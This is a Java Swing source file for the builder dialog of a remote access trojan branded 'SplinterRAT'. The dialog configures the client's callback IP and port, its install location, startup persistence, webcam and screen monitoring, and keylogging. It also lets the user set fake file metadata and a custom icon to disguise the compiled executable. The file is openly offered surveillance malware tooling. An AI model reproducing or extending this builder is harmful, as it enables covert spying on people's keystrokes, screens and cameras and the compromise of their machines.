package Builder;

import Builder.Actions.CompileAction;
import Builder.Actions.VersionCheckerAction;
import Builder.Listeners.FieldListener;
import Builder.Workers.UnzippingWorker;
import Utils.Mutex;

import javax.swing.*;
import javax.swing.filechooser.FileNameExtensionFilter;

import java.awt.*;

import java.awt.event.FocusAdapter;
import java.awt.event.FocusEvent;
import java.io.File;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;


public class CompilerGUI extends JDialog{
    private JTabbedPane tabPane;
    private final GridBagConstraints constraints = new GridBagConstraints();
    private JButton compileButton;
    private final Cursor handCursor = new Cursor(Cursor.HAND_CURSOR);
    private JCheckBox webcamCheckBox;
    private JCheckBox keyloggerCheckBox;

    private JButton checkButton;

    private final ExecutorService executor = Executors.newFixedThreadPool(10);


    public CompilerGUI(JFrame parentFrame) {
        super(parentFrame, "Compiler");
        executor.execute(new UnzippingWorker(this));
        this.setModal(true);
        this.setResizable(false);
        this.setSize(450, 350);
        this.setLocationRelativeTo(null);
        this.setLayout(new GridBagLayout());
        addTabbedPane();
        addLowerPanel();
        this.setVisible(true);
    }

    private void addTabbedPane() {
        tabPane = new JTabbedPane();
        addIdentificationPanel();
        addInstallationPanel();
        addModulesPanel();
        addAssemblyPanel();
        addCompilePanel();
        constraints.gridx = 0;
        constraints.gridy = 0;
        constraints.gridwidth = 1;
        constraints.gridheight = 1;
        constraints.fill = GridBagConstraints.BOTH;
        constraints.weighty = 1.0;
        constraints.weightx = 1.0;
        this.add(tabPane, constraints);
    }

    private void addLowerPanel() {
        JPanel lowerPanel = new JPanel();
        lowerPanel.setBackground(new Color(57, 60, 62));
        lowerPanel.setLayout(new FlowLayout(FlowLayout.RIGHT));
        JButton goBackButton = new JButton("< Back ");
        goBackButton.setVisible(false);
        goBackButton.setBackground(new Color(26, 33, 42));
        goBackButton.addActionListener(e -> tabPane.setSelectedIndex(tabPane.getSelectedIndex() - 1));
        lowerPanel.add(goBackButton);

        lowerPanel.add(compileButton);

        JButton nextButton = new JButton("Next >");
        nextButton.setCursor(handCursor);
        nextButton.setBackground(new Color(23, 32, 42));
        nextButton.addActionListener(e -> tabPane.setSelectedIndex(tabPane.getSelectedIndex() + 1));
        lowerPanel.add(nextButton);
        tabPane.addChangeListener(e -> {
            switch (tabPane.getSelectedIndex()) {
                case 0 -> {
                    compileButton.setVisible(false);
                    goBackButton.setVisible(false);
                    nextButton.setVisible(true);
                }
                case 1, 2, 3 -> {
                    goBackButton.setVisible(true);
                    nextButton.setVisible(true);
                    compileButton.setVisible(false);
                }
                case 4 -> {
                    nextButton.setVisible(false);
                    compileButton.setVisible(true);
                    goBackButton.setVisible(true);
                }
            }
        });
        constraints.gridx = 0;
        constraints.gridy = 1;
        constraints.gridwidth = 1;
        constraints.gridheight = 1;
        constraints.fill = GridBagConstraints.HORIZONTAL;
        constraints.weighty = 0.0;
        this.add(lowerPanel, constraints);
    }

    private void addCompilePanel() {
        JPanel compilePanel = new JPanel();
        compilePanel.setLayout(new GridBagLayout());
        GridBagConstraints constraints = new GridBagConstraints();
        constraints.gridx = 0;
        constraints.gridy = 0;
        constraints.gridwidth = 3;
        constraints.gridheight = 1;
        constraints.fill = GridBagConstraints.HORIZONTAL;
        constraints.weightx = 1;
        constraints.weighty = 0;
        constraints.insets = new Insets(6, 6, 6, 6);

        JLabel tagLabel = new JLabel("Path where g++ and windres is located if it isn't in the system variables:");
        compilePanel.add(tagLabel, constraints);
        String defaultCompiler = "Default system compiler";
        JComboBox<String> compilerComboBox = new JComboBox<>();
        compilerComboBox.addItem(defaultCompiler);
        compilerComboBox.addItem("Select custom path");

        String utilities = "g++ / windres";
        JTextField compilerPathField = new JTextField(utilities);
        compilerPathField.setEditable(false);

        compilerComboBox.addActionListener(e -> {
            String selectedItem = (String) compilerComboBox.getSelectedItem();
            compileButton.setEnabled(false);
            if (selectedItem != null && !selectedItem.equals(defaultCompiler)) {
                JFileChooser fc = new JFileChooser();
                fc.setFileSelectionMode(JFileChooser.DIRECTORIES_ONLY);
                int returnVal = fc.showSaveDialog(this);
                if (returnVal == JFileChooser.APPROVE_OPTION) {
                    File selectedFolder = fc.getSelectedFile();
                    compilerPathField.setText(selectedFolder.toString());
                } else {
                    compilerComboBox.setSelectedIndex(0);
                }
            } else {
                compilerPathField.setText(utilities);
            }

        });
        constraints.anchor = GridBagConstraints.NORTH;
        constraints.weighty = 1;
        constraints.gridy = 1;
        constraints.gridwidth = 1;
        constraints.gridx = 0;
        compilePanel.add(compilerComboBox, constraints);

        constraints.gridx = 1;
        compilePanel.add(compilerPathField, constraints);

        compileButton = new JButton("Compile");
        compileButton.setVisible(false);
        compileButton.setCursor(handCursor);
        compileButton.setBackground(new Color(0, 136, 6));
        compileButton.addActionListener(new CompileAction(this,
                new JCheckBox[]{installCheckBox, persistentClientCheckBox, webcamCheckBox, keyloggerCheckBox},
                new JTextField[]{ipField, portField, tagField, mutexField, timingField, compilerPathField,
                        subdirectoryNameField, executableNameField, clientNameStartUp, subdirectoryWebcamLogsField, subdirectoryKeyloggerField,
                        fileDescriptionField, fileVersionField, productNameField, copyrightField, originalNameField, iconPathField
                }, radioGroup));
        compileButton.setToolTipText("You must check the version you have " +
                "installed on your system using the check button");
        compileButton.setEnabled(false);


        constraints.gridx = 2;
        checkButton = new JButton("Check");
        checkButton.addActionListener(new VersionCheckerAction(compilerPathField, this, compileButton));
        compilePanel.add(checkButton, constraints);
        checkButton.setBackground(new Color(0, 83, 102));
        tabPane.add(compilePanel, "Compiler");
    }

    private JTextField fileDescriptionField;
    private JTextField fileVersionField;
    private JTextField productNameField;
    private JTextField copyrightField;
    private JTextField originalNameField;

    private JTextField iconPathField;
    private void addAssemblyPanel() {
        JPanel assemblyPanel = new JPanel();
        assemblyPanel.setLayout(new GridBagLayout());
        GridBagConstraints constraints = new GridBagConstraints();
        constraints.gridx = 0;
        constraints.gridy = 0;
        constraints.gridwidth = 1;
        constraints.gridheight = 1;
        constraints.fill = GridBagConstraints.BOTH;
        constraints.weightx = 1;
        constraints.weighty = 1;
        constraints.insets = new Insets(6, 6, 6, 6);
        JLabel fileDescriptionLabel = new JLabel("Description of file:");
        assemblyPanel.add(fileDescriptionLabel, constraints);

        constraints.gridx = 1;
        fileDescriptionField = new JTextField("This program is so pretty!");
        assemblyPanel.add(fileDescriptionField, constraints);

        constraints.gridx = 0;
        constraints.gridy = 1;
        JLabel versionOfFileAndProduct = new JLabel("Version of file and product:");
        assemblyPanel.add(versionOfFileAndProduct, constraints);


        constraints.gridx = 1;
        fileVersionField = new JTextField("0.0.0.0");
        fileVersionField.addFocusListener(new FocusAdapter() {
            @Override
            public void focusLost(FocusEvent e) {
                fileVersionField.setText(
                        fileVersionField.getText().matches("(\\d)|(\\d\\.\\d)|((\\d\\.){2}\\d)|((\\d\\.){3}\\d)")
                                ? fileVersionField.getText() : "");
            }
        });

        assemblyPanel.add(fileVersionField, constraints);

        constraints.gridx = 2;
        JLabel exampleOfVersion = new JLabel("(X.X.X.X)");
        assemblyPanel.add(exampleOfVersion, constraints);

        constraints.gridx = 0;
        constraints.gridy = 2;
        JLabel productNameLabel = new JLabel("Name of product:");
        assemblyPanel.add(productNameLabel, constraints);
        constraints.gridx = 1;
        productNameField = new JTextField("Splinter client");
        assemblyPanel.add(productNameField, constraints);


        constraints.gridx = 0;
        constraints.gridy = 3;
        JLabel copyrightLabel = new JLabel("Copyright:");
        assemblyPanel.add(copyrightLabel, constraints);

        constraints.gridx = 1;
        copyrightField = new JTextField("SplinterRAT (C)");
        assemblyPanel.add(copyrightField, constraints);


        constraints.gridx = 0;
        constraints.gridy = 4;
        JLabel originalNameLabel = new JLabel("Original name of file:");
        assemblyPanel.add(originalNameLabel, constraints);


        constraints.gridx = 1;
        originalNameField = new JTextField("client.exe");
        assemblyPanel.add(originalNameField, constraints);

        constraints.gridx = 0;
        constraints.gridy = 5;
        JButton iconButton = new JButton("Select icon");
        assemblyPanel.add(iconButton, constraints);

        constraints.gridx = 1;
        iconPathField = new JTextField();
        iconPathField.setEditable(false);
        assemblyPanel.add(iconPathField, constraints);

        iconButton.addActionListener(e -> {
            JFileChooser fileChooser = new JFileChooser();
            fileChooser.setCurrentDirectory(new File(System.getProperty("user.home")));
            fileChooser.setAcceptAllFileFilterUsed(false);
            fileChooser.setFileSelectionMode(JFileChooser.FILES_ONLY);
            fileChooser.setMultiSelectionEnabled(false);
            fileChooser.addChoosableFileFilter(new FileNameExtensionFilter(".ico", "ico"));

            int result = fileChooser.showOpenDialog(this);

            if (result == JFileChooser.APPROVE_OPTION) {
                File selectedFile = fileChooser.getSelectedFile();
                iconPathField.setText(selectedFile.getAbsolutePath());
            }
        });


        tabPane.add(assemblyPanel, "Assembly");

    }
    private JTextField subdirectoryKeyloggerField;
    private JTextField subdirectoryWebcamLogsField;

    private void addModulesPanel() {
        JPanel monitorPanel = new JPanel();
        monitorPanel.setLayout(new GridBagLayout());
        GridBagConstraints constraints = new GridBagConstraints();
        constraints.gridx = 0;
        constraints.gridy = 0;
        constraints.gridwidth = 1;
        constraints.gridheight = 1;
        constraints.fill = GridBagConstraints.HORIZONTAL;
        constraints.weightx = 1;
        constraints.weighty = 0;
        constraints.insets = new Insets(6, 6, 6, 6);
        webcamCheckBox = new JCheckBox("Webcam and screen monitoring");
        monitorPanel.add(webcamCheckBox, constraints);

        constraints.gridx = 1;
        JLabel subdirectoryWebcamLogsLabel = new JLabel("Subdirectory name:");
        subdirectoryWebcamLogsLabel.setEnabled(false);
        monitorPanel.add(subdirectoryWebcamLogsLabel, constraints);

        constraints.gridx = 2;

        subdirectoryWebcamLogsField = new JTextField("WLogs");
        subdirectoryWebcamLogsField.addFocusListener(new FieldListener(subdirectoryWebcamLogsField, "WLogs"));
        subdirectoryWebcamLogsField.setEnabled(false);
        monitorPanel.add(subdirectoryWebcamLogsField, constraints);


        constraints.gridx = 0;
        constraints.gridy = 1;
        constraints.gridwidth = 3;
        JSeparator horizontalSeparator = new JSeparator(SwingConstants.HORIZONTAL);
        monitorPanel.add(horizontalSeparator, constraints);

        constraints.anchor = GridBagConstraints.NORTH;
        constraints.gridwidth = 1;
        constraints.weighty = 1;
        constraints.gridy = 2;
        constraints.gridx = 0;
        keyloggerCheckBox = new JCheckBox("Keylogger monitoring");
        monitorPanel.add(keyloggerCheckBox, constraints);

        constraints.gridx = 1;
        JLabel subdirectoryKeyloggerLogsLabel = new JLabel("Subdirectory name:");
        subdirectoryKeyloggerLogsLabel.setEnabled(false);
        monitorPanel.add(subdirectoryKeyloggerLogsLabel, constraints);


        constraints.gridx = 2;
        subdirectoryKeyloggerField = new JTextField("KLogs");
        subdirectoryKeyloggerField.addFocusListener(new FieldListener(subdirectoryKeyloggerField,"KLogs"));
        subdirectoryKeyloggerField.setEnabled(false);
        monitorPanel.add(subdirectoryKeyloggerField, constraints);


        List<JComponent>webcamComps = new ArrayList<>();
        webcamComps.add(subdirectoryWebcamLogsLabel);
        webcamComps.add(subdirectoryWebcamLogsField);

        List<JComponent>keyloggerComps = new ArrayList<>();
        keyloggerComps.add(subdirectoryKeyloggerLogsLabel);
        keyloggerComps.add(subdirectoryKeyloggerField);

        webcamCheckBox.addActionListener(e -> webcamComps.forEach((comp)-> comp.setEnabled(((AbstractButton)e.getSource()).getModel().isSelected())));
        keyloggerCheckBox.addActionListener(e -> keyloggerComps.forEach((comp)-> comp.setEnabled(((AbstractButton)e.getSource()).getModel().isSelected())));

        tabPane.add(monitorPanel, "Modules");
    }

    private JCheckBox installCheckBox;

    private JCheckBox persistentClientCheckBox;

    private JTextField subdirectoryNameField;

    private JTextField executableNameField;

    private ButtonGroup radioGroup;

    private JTextField clientNameStartUp;

    private void addInstallationPanel() {

        JPanel installationPanel = new JPanel();
        installationPanel.setLayout(new GridBagLayout());
        GridBagConstraints mainConstraints = new GridBagConstraints();
        mainConstraints.gridx = 0;
        mainConstraints.gridy = 0;
        mainConstraints.gridwidth = 3;
        mainConstraints.gridheight = 1;
        mainConstraints.fill = GridBagConstraints.BOTH;
        mainConstraints.weightx = 1.0;
        mainConstraints.weighty = 1.0;
        mainConstraints.insets = new Insets(6, 6, 6, 6);
        installCheckBox = new JCheckBox("Install client on computer");
        installationPanel.add(installCheckBox, mainConstraints);

        mainConstraints.gridy = 1;
        JRadioButton installOnProgramFiles = new JRadioButton("Install on program files (x86)");
        installOnProgramFiles.setActionCommand("0");
        installationPanel.add(installOnProgramFiles, mainConstraints);

        mainConstraints.gridy = 2;
        JRadioButton installOnSystem = new JRadioButton("Install on system directory");
        installOnSystem.setActionCommand("1");
        installationPanel.add(installOnSystem, mainConstraints);

        mainConstraints.gridy = 3;
        JRadioButton installOnAppData = new JRadioButton("Install on AppData", true);
        installOnAppData.setActionCommand("2");
        installationPanel.add(installOnAppData, mainConstraints);

        mainConstraints.gridy = 4;
        radioGroup = new ButtonGroup();
        radioGroup.add(installOnProgramFiles);
        radioGroup.add(installOnSystem);
        radioGroup.add(installOnAppData);

        mainConstraints.gridy = 5;
        mainConstraints.gridwidth = 1;
        JLabel subdirectoryNameLabel = new JLabel("Subdirectory name: ");
        installationPanel.add(subdirectoryNameLabel, mainConstraints);

        mainConstraints.gridx = 1;
        mainConstraints.gridwidth = 1;
        subdirectoryNameField = new JTextField("Utils");
        subdirectoryNameField.addFocusListener(new FieldListener(subdirectoryNameField, "Utils"));
        installationPanel.add(subdirectoryNameField, mainConstraints);

        mainConstraints.gridy = 6;
        mainConstraints.gridx = 0;
        JLabel executableNameLabel = new JLabel("Executable name: ");
        installationPanel.add(executableNameLabel, mainConstraints);

        mainConstraints.gridy = 6;
        mainConstraints.gridx = 2;
        JLabel executableExtension = new JLabel(".exe");
        installationPanel.add(executableExtension, mainConstraints);

        mainConstraints.gridx = 1;
        executableNameField = new JTextField("client");
        executableNameField.addFocusListener(new FieldListener(executableNameField, "client"));
        installationPanel.add(executableNameField, mainConstraints);

        mainConstraints.gridx = 0;
        mainConstraints.gridy = 7;
        mainConstraints.gridwidth = 3;
        JSeparator horizontalSeparator = new JSeparator(SwingConstants.HORIZONTAL);
        installationPanel.add(horizontalSeparator, mainConstraints);

        mainConstraints.gridy = 8;
        mainConstraints.gridwidth = 1;
        persistentClientCheckBox = new JCheckBox("Server.Client start on start up: ");
        installationPanel.add(persistentClientCheckBox, mainConstraints);

        mainConstraints.gridwidth = 1;
        mainConstraints.gridx = 1;
        JLabel clientNameStartUPLabel = new JLabel("Name for start up file: ", SwingConstants.RIGHT);
        installationPanel.add(clientNameStartUPLabel, mainConstraints);


        mainConstraints.gridx = 2;
        clientNameStartUp = new JTextField("ClientStartUp");
        clientNameStartUp.addFocusListener(new FieldListener(clientNameStartUp, "ClientStartUp"));
        installationPanel.add(clientNameStartUp, mainConstraints);

        List<JComponent> listOfComponentsInstallation = new ArrayList<>();
        listOfComponentsInstallation.add(installOnProgramFiles);
        listOfComponentsInstallation.add(installOnAppData);
        listOfComponentsInstallation.add(installOnSystem);
        listOfComponentsInstallation.add(subdirectoryNameLabel);
        listOfComponentsInstallation.add(subdirectoryNameField);
        listOfComponentsInstallation.add(executableExtension);
        listOfComponentsInstallation.add(executableNameField);
        listOfComponentsInstallation.add(executableNameLabel);
        listOfComponentsInstallation.add(persistentClientCheckBox);
        listOfComponentsInstallation.add(clientNameStartUp);
        listOfComponentsInstallation.add(clientNameStartUPLabel);


        changeStateOfElements(listOfComponentsInstallation, false);

        List<JComponent> listOfStartUPComps = new ArrayList<>();
        listOfStartUPComps.add(clientNameStartUp);
        listOfStartUPComps.add(clientNameStartUPLabel);


        installCheckBox.addActionListener(e -> changeStateOfElements(listOfComponentsInstallation, ((AbstractButton) e.getSource()).getModel().isSelected()));
        persistentClientCheckBox.addActionListener(e -> changeStateOfElements(listOfStartUPComps, ((AbstractButton) e.getSource()).getModel().isSelected()));

        mainConstraints.gridx = 1;
        mainConstraints.gridheight = 1;
        tabPane.add(installationPanel, "Installation");

    }

    private void changeStateOfElements(List<JComponent> listOfComponents, boolean isEnabled) {
        for (int i=0;i<listOfComponents.size();i++) {
            if (i == 8 && !((JCheckBox) listOfComponents.get(i)).isSelected() && isEnabled) {
                listOfComponents.get(i).setEnabled(true);
                isEnabled = false;
            } else {
                listOfComponents.get(i).setEnabled(isEnabled);
            }

        }
    }


    private JTextField ipField;
    private JTextField portField;
    private JTextField mutexField;
    private JTextField tagField;
    private JTextField timingField;

    private void addIdentificationPanel() {


        JPanel identificationPanel = new JPanel();
        identificationPanel.setLayout(new GridBagLayout());
        GridBagConstraints constraints = new GridBagConstraints();

        constraints.gridx = 0;
        constraints.gridy = 0;
        constraints.gridwidth = 2;
        constraints.gridheight = 1;
        constraints.fill = GridBagConstraints.HORIZONTAL;
        constraints.weighty = 2.0;
        constraints.weightx = 1.0;
        constraints.insets = new Insets(6, 6, 6, 6);

        JLabel tagLabel = new JLabel("Server.Client tag for connection identification:");
        identificationPanel.add(tagLabel, constraints);


        constraints.gridx = 2;
        constraints.gridy = 0;
        constraints.gridwidth = 1;
        tagField = new JTextField("Utils");
        tagField.addFocusListener(new FieldListener(tagField, "Utils"));
        identificationPanel.add(tagField, constraints);


        constraints.gridx = 0;
        constraints.gridy = 1;
        constraints.gridwidth = 3;
        JLabel mutexLabel = new JLabel("Mutex is used to avoid executing the same client multiple times.");
        identificationPanel.add(mutexLabel, constraints);


        constraints.gridy = 2;
        constraints.gridwidth = 2;
        mutexField = new JTextField(Mutex.generateMutex());
        identificationPanel.add(mutexField, constraints);


        constraints.gridx = 2;
        constraints.gridwidth = 1;
        JButton mutexButton = new JButton("Generate mutex");
        mutexButton.addActionListener(e -> mutexField.setText(Mutex.generateMutex()));
        identificationPanel.add(mutexButton, constraints);


        constraints.gridx = 0;
        constraints.gridy = 3;
        constraints.gridwidth = 1;
        JLabel ipLabel = new JLabel("IP/Hostname:", SwingConstants.RIGHT);
        identificationPanel.add(ipLabel, constraints);
        String defaultIP = "192.168.1.133";

        constraints.gridx = 1;
        constraints.gridwidth = 1;
        ipField = new JTextField(defaultIP);
        ipField.addFocusListener(new FieldListener(ipField, defaultIP));
        identificationPanel.add(ipField, constraints);

        constraints.gridx = 0;
        constraints.gridwidth = 1;
        constraints.gridy = 4;
        JLabel portLabel = new JLabel("PORT:", SwingConstants.RIGHT);
        identificationPanel.add(portLabel, constraints);

        constraints.gridx = 1;
        constraints.gridwidth = 1;
        String defaultPort = "3055";
        portField = new JTextField(defaultPort);
        portField.addFocusListener(new FieldListener(portField, defaultPort));
        identificationPanel.add(portField, constraints);


        constraints.gridx = 0;
        constraints.gridy = 5;
        JLabel timingLabel = new JLabel("Timeout to retry connection:", SwingConstants.RIGHT);
        identificationPanel.add(timingLabel, constraints);

        constraints.gridx = 1;

        String defaultTime = "10000";
        timingField = new JTextField(defaultTime);
        timingField.addFocusListener(new FieldListener(timingField, defaultTime));
        identificationPanel.add(timingField, constraints);

        constraints.gridx = 2;
        constraints.insets = new Insets(0, 2, 0, 0);
        JLabel unite = new JLabel("ms");
        identificationPanel.add(unite, constraints);
        tabPane.addTab("Identification", identificationPanel);
    }



    public JButton getCompileButton() {
        return compileButton;
    }

    public JButton getCheckButton() {
        return checkButton;
    }

    public ExecutorService getExecutor() {
        return executor;
    }
}
